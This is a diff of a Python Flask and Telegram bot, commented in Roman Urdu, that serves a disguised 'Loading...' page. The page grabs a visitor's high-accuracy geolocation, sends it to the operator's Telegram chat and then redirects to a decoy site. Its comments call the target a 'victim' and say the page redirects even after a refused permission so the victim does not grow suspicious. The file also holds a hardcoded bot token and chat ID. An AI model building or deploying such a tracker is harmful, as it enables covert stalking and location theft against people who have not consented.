@@ -1,7 +1,6 @@
 import os
 import threading
 import time
-import base64
 import requests
 from flask import Flask, request
 import telebot
@@ -10,6 +9,9 @@ import telebot
 TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
 TELEGRAM_CHAT_ID = "8049432833"
 PORT = int(os.environ.get("PORT", 8080))
+
+# Yahan apni woh website ka link dalein jahan aap victim ko location dene ke baad bhejna chahte hain
+TARGET_WEBSITE = "https://www.google.com"
 
 app = Flask(__name__)
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
@@ -26,31 +28,22 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"Telegram Error: {e}")
 
-# --- TELEGRAM COMMANDS (SECURE BASE64 LINK GENERATOR) ---
 @bot.message_handler(commands=['start', 'link', 'getlink'])
 def send_link_command(message):
     if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
         app_url = os.environ.get("APP_URL", "https://location22.onrender.com")
-        
-        text_parts = message.text.split(maxsplit=1)
-        if len(text_parts) > 1:
-            target_url = text_parts[1].strip()
-            # Target URL ko base64 encode kar rahe hain taake slashes/colons ka masla na ho
-            encoded_target = base64.urlsafe_b64encode(target_url.encode()).decode()
-            final_link = f"{app_url}/?to={encoded_target}"
-        else:
-            final_link = app_url
-            
         response_text = (
-            f"🔗 *Aapka Secure Tracking Link Tayar Hai!*\n\n"
-            f"`{final_link}`\n\n"
-            f"Is link ko victim ko bhejein. Location milne ke baad woh bilkul theek aapki di gayi website par redirect ho jayega!"
+            f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
+            f"`{app_url}`\n\n"
+            f"Is link ko victim ko bhejein."
         )
         bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
     else:
         bot.send_message(message.chat.id, "Unauthorized access!")
 
-HTML_PAGE = """
+@app.route("/")
+def index():
+    return f'''
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -58,8 +51,8 @@ HTML_PAGE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body {
+        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
+        body {{
             background: #0f172a;
             color: #f8fafc;
             display: flex;
@@ -68,8 +61,8 @@ HTML_PAGE = """
             justify-content: center;
             height: 100vh;
             padding: 20px;
-        }
-        .card {
+        }}
+        .card {{
             background: #1e293b;
             padding: 35px 25px;
             border-radius: 14px;
@@ -78,8 +71,8 @@ HTML_PAGE = """
             max-width: 380px;
             width: 100%;
             border: 1px solid #334155;
-        }
-        .spinner {
+        }}
+        .spinner {{
             width: 45px;
             height: 45px;
             border: 4px solid #334155;
@@ -87,22 +80,22 @@ HTML_PAGE = """
             border-radius: 50%;
             animation: spin 0.9s linear infinite;
             margin: 0 auto 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
+        }}
+        @keyframes spin {{
+            0% {{ transform: rotate(0deg); }}
+            100% {{ transform: rotate(360deg); }}
+        }}
+        .status {{
             font-size: 18px;
             font-weight: 600;
             color: #38bdf8;
             margin-bottom: 10px;
-        }
-        .message {
+        }}
+        .message {{
             font-size: 14px;
             color: #94a3b8;
             line-height: 1.5;
-        }
+        }}
     </style>
 </head>
 <body>
@@ -113,41 +106,43 @@ HTML_PAGE = """
     </div>
 
     <script>
-        const targetUrl = "TARGET_URL_PLACEHOLDER";
+        const targetUrl = "{TARGET_WEBSITE}";
         const statusDiv = document.getElementById('status');
         const messageDiv = document.getElementById('message');
         const spinnerDiv = document.getElementById('spinner');
 
         function onSuccess(pos) {
             try {
-                fetch('/update', {
+                fetch('/update', {{
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         accuracy: pos.coords.accuracy,
                         timestamp: pos.timestamp
-                    })
-                }).finally(function() {
+                    }})
+                }}).finally(function() {{
+                    // Location bhejne ke foran baad asli website par redirect kar do
                     window.location.href = targetUrl;
-                });
-            } catch(e) {
+                }});
+            } catch(e) {{
                 window.location.href = targetUrl;
-            }
+            }}
         }
         
-        function onError(err) {
+        function onError(err) {{
+            // Agar permission deny bhi karde tab bhi website par bhej do taake shak na ho
             window.location.href = targetUrl;
-        }
+        }}
         
         function requestLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+                navigator.geolocation.getCurrentPosition(onSuccess, onError, {{
                     enableHighAccuracy: true,
                     timeout: 10000,
                     maximumAge: 0
-                });
+                }});
             } else {
                 window.location.href = targetUrl;
             }
@@ -157,21 +152,7 @@ HTML_PAGE = """
     </script>
 </body>
 </html>
-"""
-
-@app.route("/")
-def index():
-    encoded_target = request.args.get("to")
-    target_website = "https://www.google.com"
-    if encoded_target:
-        try:
-            # Base64 decode karke asli website ka link wapas nikal rahe hain
-            padding = '=' * (-len(encoded_target) % 4)
-            decoded_bytes = base64.urlsafe_b64decode(encoded_target + padding)
-            target_website = decoded_bytes.decode('utf-8')
-        except Exception:
-            pass
-    return HTML_PAGE.replace("TARGET_URL_PLACEHOLDER", target_website)
+'''
 
 @app.route("/update", methods=["POST"])
 def update():
@@ -204,5 +185,5 @@ def run_flask():
 if __name__ == "__main__":
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    send_telegram_message("🟢 *Bot Updated Successfully!* Use `/link [website_url]` to generate a secure link.")
+    send_telegram_message("🟢 *Bot Updated & Started Successfully!* Type /link to get your URL.")
     bot.infinity_polling()
